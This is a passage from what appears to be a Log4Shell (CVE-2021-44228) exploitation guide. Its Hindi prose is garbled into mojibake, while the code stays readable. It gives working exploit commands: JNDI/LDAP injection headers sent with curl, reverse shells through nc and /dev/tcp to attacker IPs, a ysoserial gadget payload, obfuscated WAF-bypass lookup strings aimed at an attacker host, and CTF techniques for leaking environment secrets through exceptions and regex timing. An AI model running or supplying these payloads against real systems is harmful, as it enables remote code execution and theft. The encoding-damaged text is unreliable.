After reading the code just a couple of minutes, in _com.feihong.ldap.LdapServer_ and _com.feihong.ldap.HTTPServer_ you can see how the **LDAP рдФрд░ HTTP рд╕рд░реНрд╡рд░ рдмрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ**. The LDAP server will understand what payload need to be served and will redirect the victim to the HTTP server, which will serve the exploit.\
In _com.feihong.ldap.gadgets_ you can find **рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рдЧреИрдЬреЗрдЯреНрд╕** that can be used to excute the desired action (potentially execute arbitrary code). And in _com.feihong.ldap.template_ you can see the different template classes that will **рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ**.

You can see all the available exploits with **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Some useful ones are:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
рддреЛ, рд╣рдорд╛рд░реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╡рд╣ рдбреЙрдХрд░ рдХрдордЬреЛрд░ рдРрдк рдЪрд▓ рд░рд╣рд╛ рд╣реИред рдЗрд╕реЗ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
рдЬрдм рдЖрдк рд╣рдорд▓реЗ рднреЗрдЬрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрд╕ рдЯрд░реНрдорд┐рдирд▓ рдореЗрдВ рдХреБрдЫ рдЖрдЙрдЯрдкреБрдЯ рджреЗрдЦреЗрдВрдЧреЗ рдЬрд╣рд╛рдБ рдЖрдкрдиреЗ **JNDIExploit-1.2-SNAPSHOT.jar** рдЪрд▓рд╛рдпрд╛ рдерд╛ред

**рдЕрдиреНрдп рд╢реЛрд╖рдг рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд▓рд┐рдП `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рди рднреВрд▓реЗрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдкрдХреЛ рдЗрд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ, рддреЛ рдЖрдк LDAP рдФрд░ HTTP рд╕рд░реНрд╡рд░реЛрдВ рдХрд╛ рдкреЛрд░реНрдЯ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

рдкрд┐рдЫрд▓реЗ рд╢реЛрд╖рдг рдХреЗ рд╕рдорд╛рди, рдЖрдк рдЗрд╕ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП URLs рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_рдпрд╣ рд╣рдорд▓рд╛ рдПрдХ рдХрд╕реНрдЯрдо рдЬрдирд░реЗрдЯреЗрдб рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрди рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛рдУрдВ рдореЗрдВ рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдЬреИрд╕реЗ рдХрд┐ **THM рд╕реЛрд▓рд░ рд░реВрдо**ред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ (рдХреНрдпреЛрдВрдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЬрд╛рд╡рд╛ рдХреЛ LDAP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░рд┐рдореЛрдЯ рдХреЛрдбрдмреЗрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ) рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИред_

### RCE - JNDI-Injection-Exploit-Plus

[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus) рдПрдХ рдФрд░ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ **рдХрд╛рдо рдХрд░рдиреЗ рдпреЛрдЧреНрдп JNDI рд▓рд┐рдВрдХ** рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдФрд░ RMI рд╕рд░реНрд╡рд░, LDAP рд╕рд░реНрд╡рд░ рдФрд░ HTTP рд╕рд░реНрд╡рд░ рд╢реБрд░реВ рдХрд░рдХреЗ рдмреИрдХрдЧреНрд░рд╛рдЙрдВрдб рд╕реЗрд╡рд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред\

### RCE - ysoserial & JNDI-Exploit-Kit

рдпрд╣ рд╡рд┐рдХрд▓реНрдк рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ **рдЬрд╛рд╡рд╛ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХреНрд▓рд╛рд╕реЗрд╕ рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рд╕рднреА рдкрд░ рдирд╣реАрдВ**ред рдЗрд╕рд▓рд┐рдП, **ysoserial** рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рд╕реЗрд╕ рдХреЗ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди** рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ **рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЧреИрдЬреЗрдЯреНрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (_ysoserial рджреНрд╡рд╛рд░рд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреА рдЧрдИ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рд╕ рдХреЛ рд╢рд┐рдХрд╛рд░ рдЬрд╛рд╡рд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдпрд╣ рд╣рдорд▓рд╛ рдХрд╛рдо рдХрд░реЗ_)ред

**ysoserial** рдпрд╛ [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЙрд╕ рдбреАрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ JNDI рджреНрд╡рд╛рд░рд╛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
[**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ **JNDI рд▓рд┐рдВрдХ** рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВ рдЬрд╣рд╛рдБ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрдордЬреЛрд░ рдорд╢реАрдиреЛрдВ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдЧрд╛ред рдЖрдк **JNDI-Exploit-Kit** рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЧрдП **рд╡рд┐рднрд┐рдиреНрди рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ** рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЕрдкрдиреЗ **рд╕реНрд╡рдпрдВ рдХреЗ рдбреАрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдкреЗрд▓реЛрдб** (рдЬреЛ рдЖрдкрдиреЗ рдпрд╛ ysoserial рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдХрд┐рдП рд╣реИрдВ) рдХреЛ рд╕рд░реНрд╡ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (1118).png>)

рдЕрдм рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдПрдХ рдЙрддреНрдкрдиреНрди JNDI рд▓рд┐рдВрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ **reverse shell** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдмрд╕ рдПрдХ рдХрдордЬреЛрд░ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ log4j рдХреЛ рднреЗрдЬрдХрд░: **`${ldap://10.10.14.10:1389/generated}`**

### Bypasses
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:─▒}}:ldap://...} //Notice the unicode "i"
```
### Automatic Scanners

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - рд╕реНрдерд╛рдиреАрдп рдХрдордЬреЛрд░ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рдЦреЛрдЬреЗрдВ

### Labs to test

* [**LogForge HTB рдорд╢реАрди**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar рдХрдорд░рд╛**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Post-Log4Shell Exploitation

рдЗрд╕ [**CTF рд▓реЗрдЦ**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) рдореЗрдВ рдпрд╣ рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ **Log4J** рдХреА рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░рдирд╛ **рд╕рдВрднрд╡** рд╣реИред

Log4j рдХреЗ [**рд╕реБрд░рдХреНрд╖рд╛ рдкреГрд╖реНрда**](https://logging.apache.org/log4j/2.x/security.html) рдореЗрдВ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рд╡рд╛рдХреНрдп рд╣реИрдВ:

> рд╕рдВрд╕реНрдХрд░рдг 2.16.0 (Java 8 рдХреЗ рд▓рд┐рдП) рд╕реЗ, **рд╕рдВрджреЗрд╢ рд▓реБрдХрдЕрдк рд╕реБрд╡рд┐рдзрд╛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╣рдЯрд╛ рджреА рдЧрдИ рд╣реИ**ред **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рд▓реБрдХрдЕрдк рдЕрднреА рднреА рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, Log4j рдЕрдм рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ JNDI рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИред рдЕрдм рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ JNDI рд▓реБрдХрдЕрдк рдХреЛ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

> рд╕рдВрд╕реНрдХрд░рдг 2.17.0 рд╕реЗ, (рдФрд░ Java 7 рдФрд░ Java 6 рдХреЗ рд▓рд┐рдП 2.12.3 рдФрд░ 2.3.1), **рдХреЗрд╡рд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рд▓реБрдХрдЕрдк рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рдкреБрдирд░рд╛рд╡реГрддреНрдд рд░реВрдк рд╕реЗ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**; рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧ рдореЗрдВ, рдХреЗрд╡рд▓ рд╢реАрд░реНрд╖-рд╕реНрддрд░реАрдп рд▓реБрдХрдЕрдк рдХреЛ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдХреЛрдИ рднреА рдиреЗрд╕реНрдЯреЗрдб рд▓реБрдХрдЕрдк рд╣рд▓ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЖрдк **рдХрд┐рд╕реА рднреА `jndi` рд╢реЛрд╖рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рднреВрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рдкреБрдирд░рд╛рд╡реГрддреНрдд рд▓реБрдХрдЕрдк** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЙрдиреНрд╣реЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЙрд╕ CTF рдореЗрдВ рдпрд╣ log4j2.xml рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

In [this CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) рд╣рдорд▓рд╛рд╡рд░ рдиреЗ `${sys:cmd}` рдХрд╛ рдорд╛рди рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдФрд░ рдПрдХ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рд╕реЗ рдзреНрд╡рдЬ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереАред\
рдЬреИрд╕рд╛ рдХрд┐ [**рдкрд┐рдЫрд▓реЗ рдкреЗрд▓реЛрдбреНрд╕**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) рдореЗрдВ рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реИ, рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВ, рдЬреИрд╕реЗ: **`${env:FLAG}`**ред рдЗрд╕ CTF рдореЗрдВ рдпрд╣ рдмреЗрдХрд╛рд░ рдерд╛ рд▓реЗрдХрд┐рди рдпрд╣ рдЕрдиреНрдп рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЬреАрд╡рди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдмреЗрдХрд╛рд░ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ред

### Exfiltration in Exceptions

CTF рдореЗрдВ, рдЖрдк **log4J рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ java рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ stderr** рддрдХ рдкрд╣реБрдБрдЪ рдирд╣реАрдВ рд╕рдХрддреЗ рдереЗ, рд▓реЗрдХрд┐рди Log4J **рдЕрдкрд╡рд╛рдж stdout рдкрд░ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ**, рдЬреЛ python рдРрдк рдореЗрдВ рдкреНрд░рд┐рдВрдЯ рдХрд┐рдП рдЧрдП рдереЗред рдЗрд╕рдХрд╛ рдорддрд▓рдм рдерд╛ рдХрд┐ рдПрдХ рдЕрдкрд╡рд╛рдж рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдХреЗ рд╣рдо рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рдереЗред рдзреНрд╡рдЬ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдкрд╡рд╛рдж рдерд╛: **`${java:${env:FLAG}}`ред** рдпрд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **`${java:CTF{blahblah}}`** рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ рдФрд░ рдзреНрд╡рдЬ рдХреЗ рдорд╛рди рдХреЗ рд╕рд╛рде рдПрдХ рдЕрдкрд╡рд╛рдж рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛:

![](<../../.gitbook/assets/image (1023).png>)

### Conversion Patterns Exceptions

рдмрд╕ рдпрд╣ рдЙрд▓реНрд▓реЗрдЦ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирдП [**conversion patterns**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) рднреА рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрд╡рд╛рдж рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ `stdout` рдкрд░ рд▓реЙрдЧ рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

![](<../../.gitbook/assets/image (683).png>)

рдпрд╣ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЗ рднреАрддрд░ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рдкрд╛рдпрд╛ рдЧрдпрд╛, рдХреНрдпреЛрдВрдХрд┐ рд▓реБрдХрдЕрдк рдХреЛ рд░реВрдкрд╛рдВрддрд░рдг рдкреИрдЯрд░реНрди рд╕реЗ рдкрд╣рд▓реЗ рд╣рд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдЕрдиреНрдп рдЪреАрдЬреЛрдВ рдЬреИрд╕реЗ рдкрд╣рдЪрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### Conversion Patterns Regexes

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреБрдЫ **conversion patterns рдЬреЛ regexes рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реБрдХрдЕрдк рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ, regexes рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдФрд░ **рдмрд╛рдЗрдирд░реА рд╕рд░реНрдЪ** рдпрд╛ **рд╕рдордп рдЖрдзрд╛рд░рд┐рдд** рд╡реНрдпрд╡рд╣рд╛рд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗред

* **Binary search via exception messages**

рд░реВрдкрд╛рдВрддрд░рдг рдкреИрдЯрд░реНрди **`%replace`** рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕рд╛рдордЧреНрд░реА** рдХреЛ **рд╕реНрдЯреНрд░рд┐рдВрдЧ** рд╕реЗ **рдмрджрд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **regexes** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдпрд╣ рдЗрд╕ рддрд░рд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ: `replace{pattern}{regex}{substitution}`\
рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдЖрдк **рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рднреАрддрд░ рдХреБрдЫ рднреА рдореЗрд▓ рдЦрд╛рдиреЗ рдкрд░ рдЕрдкрд╡рд╛рдж рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдмрджрд▓рдиреЗ рдХрд╛ рдХрд╛рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдФрд░ рдпрджрд┐ рдпрд╣ рдирд╣реАрдВ рдорд┐рд▓рд╛ рддреЛ рдХреЛрдИ рдЕрдкрд╡рд╛рдж рдирд╣реАрдВ) рдЗрд╕ рддрд░рд╣:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **рд╕рдордп рдЖрдзрд╛рд░рд┐рдд**

рдЬреИрд╕рд╛ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, **`%replace`** **regexes** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ [**ReDoS рдкреГрд╖реНрда**](../regular-expression-denial-of-service-redos.md) рд╕реЗ рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **timeout** рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛рдП рдпрджрд┐ рдзреНрд╡рдЬ рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` рдЬреИрд╕рд╛ рдПрдХ рдкреЗрд▓реЛрдб рдЙрд╕ CTF рдореЗрдВ **timeout** рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ред

рдЗрд╕ [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) рдореЗрдВ, ReDoS рд╣рдорд▓реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╕рдордп рдХреЗ рдЕрдВрддрд░ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **amplification attack** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛:

> ```
